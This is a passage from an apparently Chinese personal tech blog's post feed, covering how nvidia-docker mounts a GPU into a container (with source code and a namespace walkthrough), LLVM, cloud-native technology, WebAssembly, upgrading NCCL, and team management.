78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-compiler.so.418.67 is empty, not checked.</span><br><span class="line">W1222 07:23:34.072952 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-fatbinaryloader.so.418.67 is empty, not checked.</span><br><span class="line">W1222 07:23:34.073004 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-ml.so.1 is empty, not checked.</span><br><span class="line">W1222 07:23:34.073038 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-ml.so.418.67 is empty, not checked.</span><br><span class="line">W1222 07:23:34.073127 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-opencl.so.1 is empty, not checked.</span><br><span class="line">W1222 07:23:34.073158 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-opencl.so.418.67 is empty, not checked.</span><br><span class="line">W1222 07:23:34.073219 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-ptxjitcompiler.so.1 is empty, not checked.</span><br><span class="line">W1222 07:23:34.073259 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-ptxjitcompiler.so.418.67 is empty, not checked.</span><br><span class="line">I1222 07:23:34.114387 78755 nvc.c:337] shutting down library context</span><br><span class="line">I1222 07:23:34.618210 78760 driver.c:156] terminating driver service</span><br><span class="line">I1222 07:23:34.618980 78755 driver.c:196] driver service terminated successfully</span><br></pre></td></tr></table></figure>

<p>重点是这一步 挂载某个GPU</p>
<font size="5">
I1222 07:23:34.043137 78755 nvc_mount.c:412] mounting /proc/driver/nvidia/gpus/0000:3b:00.0 at /var/lib/docker/overlay2/6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b/merged/proc/driver/nvidia/gpus/0000:3b:00.0


<p>I1222 07:23:34.043225 78755 nvc_mount.c:499] whitelisting device node 195:0<br></p></font><p></p>
<p>使用的是这个函数</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">static char *</span><br><span class="line">mount_procfs_gpu(<span class="keyword">struct</span> error *err, <span class="keyword">const</span> char *root, <span class="keyword">const</span> <span class="keyword">struct</span> nvc_container *cnt, <span class="keyword">const</span> char *busid)</span><br><span class="line">&#123;</span><br><span class="line">		char src[PATH_MAX];</span><br><span class="line">		char dst[PATH_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">		char *gpu = NULL;</span><br><span class="line">		char *mnt = NULL;</span><br><span class="line">		mode_t mode;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> off = <span class="number">0</span>;; off += <span class="number">4</span>) &#123;</span><br><span class="line">				<span class="comment">/* XXX Check if the driver procfs uses 32-bit or 16-bit PCI domain */</span></span><br><span class="line">				<span class="keyword">if</span> (xasprintf(err, &amp;gpu, <span class="string">"%s/gpus/%s"</span>, NV_PROC_DRIVER, busid + off) &lt; <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">return</span> (NULL);</span><br><span class="line">				<span class="keyword">if</span> (path_join(err, src, root, gpu) &lt; <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">goto</span> fail;</span><br><span class="line">				<span class="keyword">if</span> (path_resolve_full(err, dst, cnt-&gt;cfg.rootfs, gpu) &lt; <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">goto</span> fail;</span><br><span class="line">				<span class="keyword">if</span> (file_mode(err, src, &amp;mode) == <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">if</span> (err-&gt;code != ENOENT || off != <span class="number">0</span>)</span><br><span class="line">						<span class="keyword">goto</span> fail;</span><br><span class="line">				*dst = <span class="string">'\0'</span>;</span><br><span class="line">				free(gpu);</span><br><span class="line">				gpu = NULL;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (file_create(err, dst, NULL, cnt-&gt;uid, cnt-&gt;gid, mode) &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">		log_infof(<span class="string">"mounting %s at %s"</span>, src, dst);</span><br><span class="line">		<span class="keyword">if</span> (xmount(err, src, dst, NULL, MS_BIND, NULL) &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> fail;</span><br><span class="line">		<span class="keyword">if</span> (xmount(err, NULL, dst, NULL, MS_BIND|MS_REMOUNT | MS_RDONLY|MS_NODEV|MS_NOSUID|MS_NOEXEC, NULL) &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> fail;</span><br><span class="line">		<span class="keyword">if</span> ((mnt = xstrdup(err, dst)) == NULL)</span><br><span class="line">				<span class="keyword">goto</span> fail;</span><br><span class="line">		free(gpu);</span><br><span class="line">		<span class="keyword">return</span> (mnt);</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">		free(gpu);</span><br><span class="line">		unmount(dst);</span><br><span class="line">		<span class="keyword">return</span> (NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="proc-文件系统"><a href="#proc-文件系统" class="headerlink" title="proc 文件系统"></a>proc 文件系统</h3><p>Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 </p>
<p>基于/proc文件系统如上所述的特殊性，其内的文件也常被称作虚拟文件，并具有一些独特的特点。例如，其中有些文件虽然使用查看命令查看时会返回大量信息，但文件本身的大小却会显示为0字节。此外，这些特殊文件中大多数文件的时间及日期属性通常为当前系统时间和日期，这跟它们随时会被刷新（存储于RAM中）有关。 </p>
<p>为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如/proc/scsi目录中存储的就是当前系统上所有SCSI设备的相关信息，/proc/N中存储的则是系统当前正在运行的进程的相关信息，其中N为正在运行的进程（可以想象得到，在某进程结束后其相关目录则会消失）。 </p>
<p>大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如apm、free、lspci或top查看时却可以有着不错的表现。 </p>
<h2 id="proc-文件系统原理"><a href="#proc-文件系统原理" class="headerlink" title="proc 文件系统原理"></a>proc 文件系统原理</h2><p>proc文件系统是一个伪文件系统，它只存在于内存中，不在外存存储。proc提供了访问系统内核信息的接口。用户和应用程序可以通过proc访问系统信息。用户和应用程序可以通过proc改变内核的某些参数。由于进程等系统信息是动态改变的，所以proc系统动态从系统内核读出所需信息，并提交给读取它的用户和应用程序。</p>
<p>是否可以动态修改这个文件系统呢？</p>
<h3 id="三个项目的关系"><a href="#三个项目的关系" class="headerlink" title="三个项目的关系"></a>三个项目的关系</h3><p>包含三个项目<br> libnvidia-container项目（核心项目，挂载GPU驱动）、nvidia-container-runtime 项目、nvidia-container-toolkit项目<br> 其中 nvidia-container-toolkit 和libnvidia-container 两个项目时必须安装的，对于nvidia-container-runtime 只是为了方便docker run 直接使用，增加hook 函数使用<br>nvidia-container-runtime 为 构造OCI 的hook，hook的具体实现为nvidia-container-toolkit项目，nvidia-container-toolkit项目会最终调用libnvidia-container项目的cli进行具体的配置<br>三个项目的调用顺序<br> docker runc -&gt;  nvidia-container-runtime-&gt; nvidia-container-toolkit -&gt;libnvidia-container</p>
<h3 id="Command-line-创建挂载GPU的容器"><a href="#Command-line-创建挂载GPU的容器" class="headerlink" title="Command line 创建挂载GPU的容器"></a>Command line 创建挂载GPU的容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Setup a new set of namespaces </span></span><br><span class="line"><span class="comment">#建立暂存文件夹，并在其创建rootfs目录</span></span><br><span class="line"><span class="built_in">cd</span> $(mktemp -d) &amp;&amp; mkdir rootfs</span><br><span class="line"><span class="comment"># 对于mount pid 命名空间 与parent 的命名空间隔离,</span></span><br><span class="line"><span class="comment">#--fork  Fork the specified program as a child process of unshare rather than running it directly.   This  is  useful  when creating a new pid namespace</span></span><br><span class="line"><span class="comment">#man unshare</span></span><br><span class="line">sudo unshare --mount --pid --fork</span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup a rootfs based on Ubuntu 16.04 inside the new namespaces</span></span><br><span class="line"><span class="comment">#在新的命名空间下载一个rootfs 文件</span></span><br><span class="line">curl http://cdimage.ubuntu.com/ubuntu-base/releases/16.04/release/ubuntu-base-16.04.6-base-amd64.tar.gz | tar -C rootfs -xz</span><br><span class="line"></span><br><span class="line"><span class="comment">#在rootfs 目录增加user，使用该目录的配置文件，指定用户和用户组ID，指定shell</span></span><br><span class="line">useradd -R $(realpath rootfs) -U -u 1000 -s /bin/bash nvidia</span><br><span class="line"><span class="comment">#将前一个目录挂载到后一个目录上，所有对后一个目录的访问其实都是对前一个目录的访问</span></span><br><span class="line">mount --<span class="built_in">bind</span> rootfs rootfs</span><br><span class="line"><span class="comment">#改变挂载类型为私有</span></span><br><span class="line">mount --make-private rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mount standard filesystems</span></span><br><span class="line"><span class="comment">#将虚拟的proc 文件系统挂载到proc 目录，这里把节点的全部GPU信息挂载到了容器</span></span><br><span class="line">mount -t proc none proc</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sysfs 文件系统挂载到 sys目录</span></span><br><span class="line">mount -t sysfs none sys</span><br><span class="line">mount -t tmpfs none tmp</span><br><span class="line">mount -t tmpfs none run</span><br><span class="line"></span><br><span class="line"><span class="comment"># Isolate the first GPU device along with basic utilities</span></span><br><span class="line">nvidia-container-cli --load-kmods configure  --no-cgroups --utility --device 0 $(<span class="built_in">pwd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change into the new rootfs</span></span><br><span class="line"><span class="comment"># pivot_root new_root put_old </span></span><br><span class="line"><span class="comment"># pivot_root把当前进程的root文件系统放到put_old目录，而使new_root成为新的root文件系统</span></span><br><span class="line">pivot_root . mnt</span><br><span class="line"><span class="built_in">exec</span> chroot --userspec 1000:1000 . env -i bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run nvidia-smi from within the container</span></span><br><span class="line">nvidia-smi -L</span><br></pre></td></tr></table></figure>

<p>尝试在不同的shell 终端挂载不同的GPU，但是都是只能显示一个GPU<br>在同样的rootfs 目录，执行挂载主机的0号GPU卡，如下图所示，此时只能查看到一张卡<br><img src="/2020/12/21/nvidia-docker-%E9%85%8D%E7%BD%AEGPU/configgpu0.png" alt="avatar"></p>
<p>然后在同样的rootfs目录，执行挂载主机的1号GPU卡，如下图所示，此时仍然只能查看到一张卡<br><img src="/2020/12/21/nvidia-docker-%E9%85%8D%E7%BD%AEGPU/configgpu1.png" alt="avatar"></p>
<p>这里的proc 文件系统是关键，执行nvidia-container-cli 在proc 文件系统内就只能查看到指定的GPU 卡了，只能对运行态容器的proc 进行处理.(proc 文件系统是内核提供的映射文件)，新挂载的是无法获取到 运行态容器的proc信息</p>
]]></content>
  </entry>
  <entry>
    <title>什么是LLVM</title>
    <url>/2021/01/26/%E4%BB%80%E4%B9%88%E6%98%AFLLVM/</url>
    <content><![CDATA[<h2 id="LLVM-介绍"><a href="#LLVM-介绍" class="headerlink" title="LLVM 介绍"></a>LLVM 介绍</h2><p>LLVM项目是模块化、可重用的编译器以及工具链技术的集合。LLVM是构架编译器(compiler)的框架系统，以C++编写而成，用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。</p>
<blockquote>
<p>趣闻：Chris Latter本来只是想写一个底层的虚拟机，这也是LLVM名字的由来，low level virtual machine，跟Java的JVM虚拟机一样，可是后来，llvm从来没有被用作过虚拟机，哪怕LLVM的名气已经传开了。所以人们决定仍然叫他LLVM，更多的时候只是当作“商标”一样的感觉在使用，其实它跟虚拟机没有半毛钱关系。官方描述如下:The name “LLVM” itself is not an acronym; it is the full name of the project. “LLVM”这个名称本身不是首字母缩略词; 它是项目的全名。</p>
</blockquote>
<h2 id="传统的编译器架构"><a href="#传统的编译器架构" class="headerlink" title="传统的编译器架构"></a>传统的编译器架构</h2><p> <img src="/2021/01/26/%E4%BB%80%E4%B9%88%E6%98%AFLLVM/1.png" alt="avatar"></p>
<ul>
<li>Frontend:前端，词法分析、语法分析、语义分析、生成中间代码</li>
<li>Optimizer:优化器，中间代码优化</li>
<li>Backend:后端生成机器码</li>
</ul>
<h2 id="LLVM-编译器架构"><a href="#LLVM-编译器架构" class="headerlink" title="LLVM 编译器架构"></a>LLVM 编译器架构</h2><p> <img src="/2021/01/26/%E4%BB%80%E4%B9%88%E6%98%AFLLVM/2.png" alt="avatar"></p>
<ul>
<li>不同的前端后端使用统一的中间代码LLVM Intermediate Representation (LLVM IR)</li>
<li>如果需要支持一种新的编程语言，那么只需要实现一个新的前端</li>
<li>如果需要支持一种新的硬件设备，那么只需要实现一个新的后端</li>
<li>优化阶段是一个通用的阶段，它针对的是统一的LLVM IR，不论是支持新的编程语言，还是支持新的硬件设备，都不需要对优化阶段做修改</li>
<li>相比之下，GCC的前端和后端没分得太开，前端后端耦合在了一起。所以GCC为了支持一门新的语言，或者为了支持一个新的目标平台，就 变得特别困难</li>
<li>LLVM现在被作为实现各种静态和运行时编译语言的通用基础结构(GCC家族、Java、.NET、Python、Ruby、Scheme、Haskell、D等)</li>
</ul>
<p>为什么使用三段式设计？优势在哪里？首先解决一个很大的问题：假如有N种语言（C、OC、C++、Swift…）的前端，同时也有M个架构（模拟器、arm64、x86…）的target，是否就需要N*M个编译器？三段式架构的价值就提现出来了，通过共享优化器的中转，很好的解决了这个问题。</p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>云原生主要技术</title>
    <url>/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<p>上一篇文章介绍了云计算和云原生，这里讲一下云原生的主要技术，主要包括容器、微服务、DevOps、ServiceMesh、ServerLess、声明式API，当然我这里并不会将具体的技术，主要还是概念相关的东西了。先上一个CNCF 生态的技术栈，前几年看的时候，没有几个，今天一看，真多啊</p>
<p><img src="/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/cncf.png" alt="avatar"></p>
<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>还是先上一张PPT的截图吧，简单明了。</p>
<p><img src="/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/docker1.png" alt="avatar"></p>
<p>1、容器作为应用的集装箱，封装应用的依赖，简化应用的部署，集装箱的这个类比，戳中了众多应用开发者的痛点，在没有使用容器之前，部署一个应用+升级一个应用是非常复杂，而且也是非常容易出现问题的地方。</p>
<p>2、容器的隔离特性，将虚拟化的隔离特性带给应用开发者，当然这里并没有多少新的技术，还是靠Linux底层的Cgroup、Namespace、Quota等等，对这些做了封装。刚看到这个类比：我们无论什么样的开发，其实都是对接口的封装，例如我们做IAAS、PAAS平台是对vmware、Kubernetes的接口的二次开发，我们比较陌生的docker，其实是对linux接口的开发，Linux其实是对底层软硬件驱动的接口开发。。。</p>
<p>3、轻量级虚拟化，如果现在最火的docker 不是轻量级，估计也会沦为CloudFoundry 中DEA+warden的下场</p>
<p>基于比较易用的镜像能力，docker以“Build Once,Run Anywhere” 的宣传口语，一统容器江湖.<br><img src="/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/docker.png" alt="avatar"></p>
<p>这里想说点别的,我们一直在用比喻去讲解docker 和容器,但是，大家应该比较清楚，比喻在让你利杰这个事务的时候，也让你停止了思考，其实比喻更适合对门外汉讲，我们技术人员看到的应该是这样的docker或者更详细点。</p>
<p><img src="/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/docker2.png" alt="avatar"></p>
<h2 id="容器编排"><a href="#容器编排" class="headerlink" title="容器编排"></a>容器编排</h2><p>按照云原生应用的十二要素原则，其实一个容器只能用于运行一个进程，那么对于分布式应用来说，必然需要一套编排管理工具，也就是用于容器的编排管理和运维，例如Kubernetes、Swarm、Mesos等，大部分还都是使用Kubernetes，由Google背书，并且具有丰富的网络、存储、计算扩展机制（好像容易扩展的开源项目才能活，例如IAAS领域的OpenStack），就下下图描述的宠物与家畜，电话接线员一样，Kubernetes 解决了容器管理/应用管理的问题，开发者把应用丢到K8s集群，然后访问应用即可。</p>
<p><img src="/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/k8s1.png" alt="avatar"></p>
<p>管理：Kubernetes的目标是让你可以像管理牲畜一样管理你的服务，而不是像宠物一样</p>
<p>编排：丰富的编排策略，用户只需要创建应用与访问应用，对于应用相关的网络、存储、数据等都不需要用户管理</p>
<h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>微服务改造意味着先选择一套大型的应用程序，然后识别出限界上下文（bounded contexts）及其内部的业务功能，并对它们进行分割，重要的是要将数据一起进行分割，也就<br>是说要采用应用数据库而非集成数据库。为了理解业务领域的内容，关键的一点就是要在一开始就采用上下文图（context map ）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">微服务 (Microservices) 是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块 (Small Building Blocks) 为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关 (Language-Independent&#x2F;Language agnostic) 的 API 集相互通信---维基百科</span><br></pre></td></tr></table></figure>
<p><big>微服务架构带来的优势</big>：<br>1、各服务开发语言无关性<br>2、各服务编译构建部署无关性<br>3、服务复用（在传统厂商，这个很难，大部分的微服务还都是定制开发的）</p>
<p>微服务架构的两个问题:</p>
<ul>
<li>服务发现：在众多的微服务组件中，服务使用者如何找到准确的微服务组件  </li>
<li>负载均衡：多实例微服务，如果实现负载均衡</li>
</ul>
<p>微服务带来的比较头大的问题，如下图，这也是云原生的下一个技术 ServiceMesh逐渐普及的原因,总结来说就是，微服务是以提高运维复杂度的代价，来提高敏捷性。是好是坏还真不好说，对于开发人员来说 有好处有坏处，好处就是开发方便，选择自己喜欢的框架和开发语言，坏处就是各个微服务交互的时候就有些问题，需要考虑的点比较多。对于运维人员来说，感觉全是坏处，原来只需要运维一个tomcat，现在需要运维N个tomcat。。。</p>
<p><img src="/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/weifuwu.png" alt="avatar"></p>
<h2 id="Service-Mesh"><a href="#Service-Mesh" class="headerlink" title="Service Mesh"></a>Service Mesh</h2><p>Service Mesh 服务网格是一个基础设施层，用于处理服务间通信。云原生应用有着复杂的服务拓扑，服务网格保证请求在这些拓扑中可靠地穿梭。在实际应用当中，服务网格通常是由一系列轻量级的网络代理组成的，它们与应用程序部署在一起，但对应用程序透明。</p>
<p>对ServiceMesh描述最好的，应该是面向容器的SideCar设计模式，这个SideCar的设计模式在ServiceMesh 还没有普及起来的时候就有人提出来了，可以看下图，通常我们第一印象就是感觉多了这个sidecar 是不是运维复杂，浪费资源等等，不过细考虑容器化的思想，其实多出来的这个sidecar只是一个进程而已。</p>
<p><img src="/2020/12/07/%E4%BA%91%E5%8E%9F%E7%94%9F%E4%B8%BB%E8%A6%81%E6%8A%80%E6%9C%AF/sidecar.png" alt="avatar"></p>
<p>这里安利一下<a href="https://istio.io/" target="_blank" rel="noopener">istio</a>，Istio是语言无关的服务治理框架，对ServiceMesh的架构、功能和API进行了标准化，与Kubernetes紧密结合</p>
<ol>
<li>数据平面，主要是智能代理（Enovy），即sidecar ，用于管理微服务之间的网络流入和流出，在创建微服务时，由istio自动注入该sidecar</li>
<li>控制平面：将用户配置的路由规则，推送到sidecar，安全相关控制<ul>
<li>主要功能 </li>
<li>动态服务发现</li>
<li>负载均衡</li>
<li>熔断</li>
<li>健康检查</li>
<li>容错、监控指标</li>
<li>灰度发布/流量控制</li>
</ul>
</li>
<li>流程：<ul>
<li>创建应用时自动注入sidecar</li>
<li>流量拦截，pod初始化时，将业务容器的流量拦截到sidecar，sidecar将流量转到业务容器</li>
<li>服务发现，sidecar查询istiod服务，获取服务实例列表</li>
<li>负责均衡：sidecar根据负载均衡策略，选择服务实例</li>
<li>流量治理：sidecar查询istiod服务，获取流量控制规则，在拦截的流量中执行流量控制</li>
<li>访问安全：sidecar进行双向认证和通道加密</li>
<li>服务监控：sidecar连接管理平面，将监控指标、日志、调用链发送istiod</li>
</ul>
</li>
</ol>
<h2 id="DevOps"><a href="#DevOps" class="headerlink" title="DevOps"></a>DevOps</h2>]]></content>
      <tags>
        <tag>云计算</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务器还是阿里云靠谱啊</title>
    <url>/2022/04/19/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%98%E6%98%AF%E9%98%BF%E9%87%8C%E4%BA%91%E9%9D%A0%E8%B0%B1%E5%95%8A/</url>
    <content><![CDATA[<p><a href="https://www.aliyun.com/daily-act/ecs/activity_selection?userCode=f4wsplfj" target="_blank" rel="noopener">阿里云服务器 推荐</a></p>
]]></content>
  </entry>
  <entry>
    <title>介绍WASM</title>
    <url>/2021/01/26/%E4%BB%8B%E7%BB%8DWASM/</url>
    <content><![CDATA[<p>在JavaScript和机器代码之间搭建桥梁，将后端的算法编译为.wasm文件导入到前端，供js调用。从理论上讲，这项新技术最终实现了让我们可以编写机器代码以在浏览器的虚拟安全沙箱中运行，甚至升级后的WASM被设计为其它语言的编译目标，允许将服务器端代码（例如C或C ++代码）编译到其中，同时在浏览器中执行。要强调的是，WASM并非由开发人员去编写，而是允许开发人员借助C、Go或其它语言编写，并使该逻辑在浏览器上工作</p>
<h2 id="WASM的设计初衷是什么？"><a href="#WASM的设计初衷是什么？" class="headerlink" title="WASM的设计初衷是什么？"></a>WASM的设计初衷是什么？</h2><ol>
<li><p>WASM的出现绝不是要让它成为一门新的编程语言，正相反，它被规划并设计为一个编译目标，允许C的开发者编译其代码，并在浏览器上运行。</p>
</li>
<li><p>WASM旨在提供高度优化的网络计算能力，并被期待去打破JavaScript在既有环境中的垄断（尽管JavaScript是一种很不错的语言，但其在设计之初就没有考虑到性能上的问题）。</p>
</li>
<li><p>WASM并不是被拿来实现网站优化的，而是尝试在运行以下这些繁重任务时，将浏览器（以及服务端运行时，例如Node.js）的运行推升到一个水准：视频编辑游戏开发AR / VR实时应用音乐编辑和流媒体加密VPN影像辨识以及，其它的一些繁重的任务可以这样说，那些你可以想到的、原本工作量巨大的web代码编译以及性能调试，回到设计初衷上，都可以被用来反向证明WASM的价值。</p>
</li>
</ol>
<h2 id="使用WASM的场景"><a href="#使用WASM的场景" class="headerlink" title="使用WASM的场景"></a>使用WASM的场景</h2><p>Tensorflow.js： 把AI和ML带给JS开发人员的库，在添加了WASM后端支持后，Tensorflow一直致力于实现更多的模型，效果如何？与纯JS版本相比，这些模型性能平均提高了10倍。，对这块没有深入研究，只是了解个概念，具体可以参考<a href="https://blog.tensorflow.org/2020/03/introducing-webassembly-backend-for-tensorflow-js.html" target="_blank" rel="noopener">这里</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>动态聚合静态聚合</title>
    <url>/2022/08/15/%E5%8A%A8%E6%80%81%E8%81%9A%E5%90%88%E9%9D%99%E6%80%81%E8%81%9A%E5%90%88/</url>
    <content><![CDATA[<p><img src="/2022/08/15/%E5%8A%A8%E6%80%81%E8%81%9A%E5%90%88%E9%9D%99%E6%80%81%E8%81%9A%E5%90%88/1.jpg" alt="avatar"></p>
]]></content>
  </entry>
  <entry>
    <title>升级nccl</title>
    <url>/2022/02/10/%E5%8D%87%E7%BA%A7nccl/</url>
    <content><![CDATA[<p>在使用nccl 2.8.4版本进行训练时，偶尔会出现训练任务卡主的问题，官方建议升级到nccl2.12版本，升级后确实训练任务能够正常运行了</p>
<p>升级nccl 流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install build-essential fakeroot devscripts lintian debhelper</span><br><span class="line">git clone -b v2.12  https:&#x2F;&#x2F;github.com&#x2F;NVIDIA&#x2F;nccl.git</span><br><span class="line">cd nccl</span><br><span class="line">make -j src.build</span><br><span class="line">make pkg.debian.build</span><br><span class="line">dpkg -l</span><br><span class="line">dpkg -r libnccl-dev</span><br><span class="line">dpkg -r libnccl2</span><br><span class="line">cd build&#x2F;pkg&#x2F;deb&#x2F;</span><br><span class="line">chmod 777 libnccl*</span><br><span class="line">dpkg -i libnccl2_2.12.6-1+cuda11.0_amd64.deb</span><br><span class="line">dpkg -i libnccl-dev_2.12.6-1+cuda11.0_amd64.deb</span><br></pre></td></tr></table></figure>

<p>运行nccl-test，确认使用了最新的nccl版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;NVIDIA&#x2F;nccl-tests.git</span><br><span class="line">cd nccl-tests&#x2F;</span><br><span class="line">make</span><br><span class="line">export NCCL_DEBUG&#x3D;INFO</span><br><span class="line">.&#x2F;build&#x2F;all_reduce_perf -b 8 -e 256M -f 2 -g 2</span><br></pre></td></tr></table></figure>
<p>   <img src="/2022/02/10/%E5%8D%87%E7%BA%A7nccl/ncclversion.png" alt="avatar"></p>
]]></content>
  </entry>
  <entry>
    <title>多种硬盘接口详解</title>
    <url>/2021/01/12/%E5%A4%9A%E7%A7%8D%E7%A1%AC%E7%9B%98%E6%8E%A5%E5%8F%A3%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/shuai0845/article/details/98330290" target="_blank" rel="noopener">https://blog.csdn.net/shuai0845/article/details/98330290</a></p>
<h1 id="固态硬盘"><a href="#固态硬盘" class="headerlink" title="固态硬盘"></a>固态硬盘</h1><p>固态驱动器（Solid State Drive），俗称固态硬盘，固态硬盘是用固态电子存储芯片阵列而制成的硬盘，因为台湾英语里把固体电容称之为Solid而得名。SSD由控制单元和存储单元（FLASH芯片、DRAM芯片）组成。固态硬盘在接口的规范和定义、功能及使用方法上与普通硬盘的完全相同，在产品外形和尺寸上也完全与普通硬盘一致。被广泛应用于军事、车载、工控、视频监控、网络监控、网络终端、电力、医疗、航空、导航设备等诸多领域。</p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2>]]></content>
  </entry>
  <entry>
    <title>团队管理</title>
    <url>/2021/01/15/%E5%9B%A2%E9%98%9F%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="痛点分析"><a href="#痛点分析" class="headerlink" title="痛点分析"></a>痛点分析</h2><h3 id="自我认知"><a href="#自我认知" class="headerlink" title="自我认知"></a>自我认知</h3><p> 从个人角度，对于新成为团队管理者，或者已经成为团队管理者一段时间，可能都存在这样的问题</p>
<ol>
<li>作为组长，依然沉迷于代码，不能自拔</li>
<li>甩手掌柜，给组员完全放权，最后检查工作结果</li>
<li>没有理论支撑，团队管理没有章法，想到哪就做到那，常常会出现丢三落四的现象，一直忙，但是产出不高</li>
<li>不重视团队成员交流</li>
</ol>
<h3 id="业务管理方面"><a href="#业务管理方面" class="headerlink" title="业务管理方面"></a>业务管理方面</h3><ol>
<li>业务目标拆分的很细，或者业务目标拆分的很粗</li>
<li>不能定义明确的验收标准</li>
<li>合理的工作绩效评估</li>
</ol>
<h3 id="团队管理"><a href="#团队管理" class="headerlink" title="团队管理"></a>团队管理</h3><ol>
<li>团队成员主动性不足，自我驱动能力差</li>
<li>绩效差的员工工作更加懈怠</li>
<li>没有技术分享的氛围</li>
</ol>
<h2 id="实践目标"><a href="#实践目标" class="headerlink" title="实践目标"></a>实践目标</h2><h3 id="自我认知-1"><a href="#自我认知-1" class="headerlink" title="自我认知"></a>自我认知</h3><p>通过培训以及阅读相关的管理书籍，对以上的管理问题有了比较深的理解，对理论的理解可以作为实践目标。兼顾管理与业务，管理不能脱离业务，找到管理与业务的平衡点，因人而异，定期Check，掌握系统的项目管理理论、团队管理理论，并能付诸实践，将与组内成员的交流作为组长必备工作。</p>
<h3 id="业务管理"><a href="#业务管理" class="headerlink" title="业务管理"></a>业务管理</h3><p>使用OKR和SMART原则制定目标，使用业务需求跟踪矩阵跟踪工作结果，采用360度绩效考核方法</p>
